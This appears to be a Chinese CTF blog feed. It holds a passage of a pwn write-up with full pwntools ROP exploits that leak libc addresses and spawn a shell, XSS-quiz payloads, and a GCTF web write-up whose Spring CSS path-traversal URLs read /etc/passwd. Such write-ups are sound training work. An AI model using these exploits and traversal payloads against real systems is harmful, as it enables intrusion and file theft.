<p>利用write函数泄露read函数地址。<code>&#39;a&#39;*offset</code>后到溢出点return跳到执行<code>pop rdi</code>，此时栈顶的数据为1，pop完后1被保存在寄存器rdi中，作为write的第一个参数。之后返回（ret）跳转到执行<code>pop rsi</code>，此时栈顶的数据为read函数的plt表地址，pop完后，其地址被保存在rsi中，作为write的第二个参数。接下去要执行pop r15，没有什么用，所以我们随便写一个p64（1）进去。再接下去就是ret（返回）跳转到func函数，以便进行下一次利用。为什么我们没有设置write的第三个参数呢？？？ 见下文。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line">read_addr = u64(p.recv(<span class="number">8</span>))</div></pre></td></tr></table></figure>
<p>前面发送payload后，先执行了正常的write函数流程，注意源程序中的write的第三个参数是0x100，所以需要先p.recv(0x100)，之后由于func的返回地址被覆盖了，程序流程会进入我们设置好的rop中。在rop链中，我们修改了write的前两个参数，此时write的函数调用如下：write(1,read_plt_addr,0x100)。我们的目的是获得read函数的地址，在64位环境下为8个字节，所以只需要截取write输出的前8个字节，即read_addr = u64（p.recv(8)）。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">system_addr = read_addr - offset_read_system</div><div class="line">binsh_addr = read_addr - offset_read_binsh</div><div class="line">log.success(<span class="string">"read_addr =&gt; &#123;&#125; "</span>.format(hex(read_addr)))</div><div class="line">log.success(<span class="string">'system_addr =&gt; &#123;&#125;'</span>.format(hex(system_addr)))</div><div class="line">log.success(<span class="string">"binsh_addr =&gt; &#123;&#125;"</span>.format(hex(binsh_addr)))</div></pre></td></tr></table></figure>
<p>获取了read函数地址后，就可以计算system（）函数和字符串sh的地址了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">payload =  <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(binsh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>第一次rop结束后，我们让它ret到func函数，接下来构造新的rop。同样利用<code>&#39;a&#39;*offset</code>先溢出到return，通过<code>pop rdi</code>，将sh字符串的地址保存到寄存器rdi中，作为system（）函数的参数。之后是ret，直接返回到system（）函数的地址，从而成功getshell（）</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170626/2.gif?raw=true" alt=""></p>
<p>附上完整的exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">"./pwn"</span>)</div><div class="line">elf = ELF(<span class="string">"./pwn"</span>)</div><div class="line">libc = ELF(<span class="string">"libc.so"</span>)</div><div class="line">offset = <span class="number">88</span></div><div class="line">offset_read_system = libc.symbols[<span class="string">"read"</span>] - libc.symbols[<span class="string">"system"</span>]</div><div class="line">offset_read_binsh =  libc.symbols[<span class="string">"read"</span>] - next(libc.search(<span class="string">"/bin/sh\x00"</span>))</div><div class="line">log.success(<span class="string">"offset_read_system =&gt; &#123;&#125;"</span>.format(hex(offset_read_system)))</div><div class="line">log.success(<span class="string">"offset_read_binsh =&gt; &#123;&#125;"</span>.format(hex(offset_read_binsh)))</div><div class="line"></div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400623</span></div><div class="line">pop_rsi_pop_r15_addr = <span class="number">0x0000000000400621</span></div><div class="line"></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">payload += p64(elf.got[<span class="string">"read"</span>])</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(elf.plt[<span class="string">'write'</span>])</div><div class="line">payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line">read_addr = u64(p.recv(<span class="number">8</span>))</div><div class="line">log.success(<span class="string">"read_addr =&gt; &#123;&#125; "</span>.format(hex(read_addr)))</div><div class="line">system_addr = read_addr - offset_read_system</div><div class="line">binsh_addr = read_addr - offset_read_binsh</div><div class="line">log.success(<span class="string">'system_addr =&gt; &#123;&#125;'</span>.format(hex(system_addr)))</div><div class="line">log.success(<span class="string">"binsh_addr =&gt; &#123;&#125;"</span>.format(hex(binsh_addr)))</div><div class="line"></div><div class="line">payload =  <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(binsh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="不提供libc"><a href="#不提供libc" class="headerlink" title="不提供libc"></a>不提供libc</h2><p>若题目没有提供libc的话，需要利用pwntool中的DynELF来泄露地址。但有些地方需要注意，因为DynELF会一直循环地去泄露地址，所以栈可能会有不可控的情况。根据<a href="http://bobao.360.cn/learning/detail/3298.html" target="_blank" rel="external">《借助DynELF实现无libc的漏洞利用小结》</a>，可以在函数地址泄露完后，调用_start函数以恢复栈。但我这里测试时，如果在泄露完成后再恢复就没办法pwn成功，我就直接把对_start的调用放到了leak函数里，每泄露一次就恢复一次栈。</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ul>
<li>利用DynELF泄露出system的地址，</li>
<li>利用read函数向可写数据段（比如.bss段）写入字符串“/bin/sh”</li>
<li>调用system，getshell。</li>
</ul>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>下面也是根据exp具体讲解。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">"./pwn"</span>)</div><div class="line">elf = ELF(<span class="string">"./pwn"</span>)</div><div class="line">offset = <span class="number">88</span></div></pre></td></tr></table></figure>
<p>注意这里，我们已经没有用到libc.so了，手里有的只有pwn这个程序。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">bss_addr = elf.bss()</div><div class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400623</span></div><div class="line">pop_rsi_pop_r15_addr = <span class="number">0x0000000000400621</span></div></pre></td></tr></table></figure>
<p>bss_addr是我们准备写入字符串的bss段地址。start_addr用于恢复栈。pop_rdi_ret_addr，pop_rsi_pop_r15_addr由ROPgadget得到。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	log.info(<span class="string">'leak address =&gt; &#123;&#125; '</span>.format(hex(address)))</div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p64(pop_rdi_ret_addr)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">	payload += p64(address)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(elf.plt[<span class="string">'write'</span>])</div><div class="line">	payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">	p.send(payload)</div><div class="line">	p.recv(<span class="number">0x100</span>)</div><div class="line">	address = p.recv(<span class="number">8</span>)</div><div class="line">	p.recv()</div><div class="line"></div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p64(start_addr)</div><div class="line">	p.send(payload)</div><div class="line">	p.recv(<span class="number">0x100</span>)</div><div class="line">	<span class="keyword">return</span> address</div></pre></td></tr></table></figure>
<p>利用rop技术，结合write（）函数，泄露出地址后又回到func函数体中。注意泄露的地址是8个字节，所以<code>address = p.recv(8)</code>，而write的第三个参数（0x100）我们没法改变，所以需要用p.recv()接收剩下的字符。接下去就是回到func函数后，会去调用_start函数，恢复栈。完了后再次进入func（），进行下一次泄露。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">d = DynELF(leak, elf = ELF(<span class="string">'./pwn'</span>))</div><div class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</div><div class="line">read_addr = d.lookup(<span class="string">"read"</span>,<span class="string">"libc"</span>)</div><div class="line"><span class="comment"># read_addr = elf.plt['read']</span></div><div class="line">log.success(<span class="string">"system address =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line">log.success(<span class="string">"read address =&gt; &#123;&#125;"</span>.format(hex(read_addr)))</div></pre></td></tr></table></figure>
<p>利用DynELF泄露出system和read函数的地址。read函数的地址，其实可以直接获得，即注释中的<code>read_addr = elf.plt[&#39;read&#39;]</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(read_addr)</div><div class="line">payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'/bin/sh\x00'</span></div><div class="line">p.send(payload)</div></pre></td></tr></table></figure>
<p>这一部分，调用read函数，向bss段写入<code>/bin/sh</code>字符串，之后再回到func函数体中。通过<code>pop_rdi_ret_addr</code>构造了read的第一个参数是0，通过<code>pop_rsi_pop_r15_addr</code>构造了read的第二个参数为<code>bss_addr</code>。接下去的那个p64(1)只是为了执行<code>pop_r15</code>没有其他用处。因此在调用read（）时是这样的：<br><code>read(0,bss_addr,0x100)</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">payload =  <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>这一部分，调用system（），利用<code>pop_rdi_ret_addr</code>提供参数<code>/bin/sh</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170626/3.gif?raw=true" alt=""></p>
<p>附上完整exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">"./pwn"</span>)</div><div class="line">elf = ELF(<span class="string">"./pwn"</span>)</div><div class="line">offset = <span class="number">88</span></div><div class="line">bss_addr = elf.bss()</div><div class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400623</span></div><div class="line">pop_rsi_pop_r15_addr = <span class="number">0x0000000000400621</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	log.info(<span class="string">'leak address =&gt; &#123;&#125; '</span>.format(hex(address)))</div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p64(pop_rdi_ret_addr)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">	payload += p64(address)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(elf.plt[<span class="string">'write'</span>])</div><div class="line">	payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">	p.send(payload)</div><div class="line">	p.recv(<span class="number">0x100</span>)</div><div class="line">	address = p.recv(<span class="number">8</span>)</div><div class="line">	p.recv()</div><div class="line"></div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p64(start_addr)</div><div class="line">	p.send(payload)</div><div class="line">	p.recv(<span class="number">0x100</span>)</div><div class="line">	<span class="keyword">return</span> address</div><div class="line"></div><div class="line">d = DynELF(leak, elf = ELF(<span class="string">'./pwn'</span>))</div><div class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</div><div class="line">read_addr = d.lookup(<span class="string">"read"</span>,<span class="string">"libc"</span>)</div><div class="line"><span class="comment"># read_addr = elf.plt['read']</span></div><div class="line">log.success(<span class="string">"system address =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line">log.success(<span class="string">"read address =&gt; &#123;&#125;"</span>.format(hex(read_addr)))</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(read_addr)</div><div class="line">payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'/bin/sh\x00'</span></div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">payload =  <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;web狗的二进制之路。&lt;br&gt;
    
    </summary>
    
      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="栈溢出" scheme="http://yoursite.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>xss-quiz-writeup</title>
    <link href="http://yoursite.com/2017/06/25/xss-quiz-writeup/"/>
    <id>http://yoursite.com/2017/06/25/xss-quiz-writeup/</id>
    <published>2017-06-25T11:25:11.000Z</published>
    <updated>2017-06-28T06:56:02.558Z</updated>
    
    <content type="html"><![CDATA[<p>xss-quiz： <a href="http://xss-quiz.int21h.jp/" target="_blank" rel="external">http://xss-quiz.int21h.jp/</a><br><a id="more"></a></p>
<h1 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage 1"></a>Stage 1</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h1 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage 2"></a>Stage 2</h1><p><a href="http://xss-quiz.int21h.jp/stage2.php" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php</a></p>
<p>尝试如下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>无反应，查看源代码：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170625/1.jpg?raw=true" alt=""></p>
<p>需要闭合前面value的双引号，所以最后payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;</div></pre></td></tr></table></figure></p>
<h1 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h1><p><a href="http://xss-quiz.int21h.jp/stage-3.php" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php</a></p>
<p>多了一个选择country的功能。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;xss-quiz： &lt;a href=&quot;http://xss-quiz.int21h.jp/&quot;&gt;http://xss-quiz.int21h.jp/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>GCTF-web-writeup</title>
    <link href="http://yoursite.com/2017/06/19/GCTF-web-writeup/"/>
    <id>http://yoursite.com/2017/06/19/GCTF-web-writeup/</id>
    <published>2017-06-19T00:11:03.000Z</published>
    <updated>2017-06-24T11:59:36.964Z</updated>
    
    <content type="html"><![CDATA[<p>GCTF-web-writeup<br><a id="more"></a></p>
<h1 id="热身题"><a href="#热身题" class="headerlink" title="热身题"></a>热身题</h1><p>题目地址：<a href="http://218.2.197.232:18001/" target="_blank" rel="external">http://218.2.197.232:18001/</a><br>访问robots.txt。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18001/robots.txt</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/3.jpg?raw=true" alt=""></p>
<p>一个个访问过去：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18001/rob0t.php</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GCTF&#123;ae609880185f1d75&#125;</div></pre></td></tr></table></figure></p>
<h1 id="springcss"><a href="#springcss" class="headerlink" title="springcss"></a>springcss</h1><p>springcss-cve-2014-3625漏洞。github上有利用脚本:<a href="https://github.com/ilmila/springcss-cve-2014-3625/blob/master/stealfile.sh" target="_blank" rel="external">https://github.com/ilmila/springcss-cve-2014-3625/blob/master/stealfile.sh</a> 。<br>这里的payload1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18015/spring-css/resources/file:/etc/passwd</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/1.jpg?raw=true" alt=""></p>
<p>payload2：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18015/spring-css/resources/file:/etc/flag</div></pre></td></tr></table></figure></p>
<p>最后flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GCTF&#123;db839442402f5874&#125;</div></pre></td></tr></table></figure></p>
<h1 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h1><p>题目地址：<a href="http://218.2.197.232:18017/" target="_blank" rel="external">http://218.2.197.232:18017/</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/2.jpg?raw=true" alt=""></p>
<p>题目给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//error_reporting(E_ERROR &amp; ~E_NOTICE);</span></div><div class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</div><div class="line">header(<span class="string">"content-type;text/html;charset=utf-8"</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))&#123;</div><div class="line">    $_SESSION[<span class="string">'src'</span>] = $_GET[<span class="string">'src'</span>];</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line">    print_r($_SESSION[<span class="string">'src'</span>]);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>里面提到了session.serialize_handler，想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》</p>
<h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>题目地址：<a href="http://218.2.197.242:18009/" target="_blank" rel="external">http://218.2.197.242:18009/</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/4.jpg?raw=true" alt=""></p>
<p>查看源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</div><div class="line">session_start();</div><div class="line"></div><div class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">""</span>, <span class="string">"gctf09"</span>);</div><div class="line"><span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</div><div class="line">   <span class="keyword">die</span>(<span class="string">"数据库连接错误，多次出现请联系管理员。"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//打印源码</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'showcode'</span>]))&#123;</div><div class="line">   highlight_file(___FILE___);</div><div class="line">   <span class="keyword">exit</span>();</div><div class="line"></div><div class="line">&#125;</div><div class="line">$user=<span class="string">""</span>;</div><div class="line"><span class="comment">// 初次访问生成用户</span></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">"name"</span>]))&#123;</div><div class="line">   $user=substr(md5(uniqid().uniqid()),<span class="number">8</span>,<span class="number">16</span>);</div><div class="line">   $_SESSION[<span class="string">"name"</span>]=$user;</div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"ss"</span>,$user,md5($user));</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt-&gt;close();</div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt-&gt;close();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">   $user=$_SESSION[<span class="string">"name"</span>];</div><div class="line">&#125;</div><div class="line"><span class="comment">//重置时清理用户信息</span></div><div class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REQUEST_METHOD"</span>] === <span class="string">"POST"</span> &amp;&amp; $_GET[<span class="string">'method'</span>]===<span class="string">"reset"</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) )&#123;</div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"DELETE FROM gctf09.`user` where name=?"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"DELETE FROM gctf09.`priv` where name=?"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"ss"</span>,$user,md5($_POST[<span class="string">'password'</span>]));</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt-&gt;close();</div><div class="line">   <span class="comment">//判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限</span></div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt-&gt;close();</div><div class="line">   $mysqli-&gt;close();</div><div class="line">   <span class="keyword">die</span>(<span class="string">"修改成功"</span>);</div><div class="line">&#125;</div><div class="line">$mysqli-&gt;close();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>初次访问生成用户时，会往user表和priv表写入数据。</p>
<p>而在重置用户时，进行了三个大的操作：</p>
<ol>
<li>删除user表中对应数据，删除priv表中对应的值。</li>
<li>向user表中插入name和新的pass，达到更新密码的目的。</li>
<li>向priv表中对应的name下notadmin的值更改（即插入）为”TRUE”。</li>
</ol>
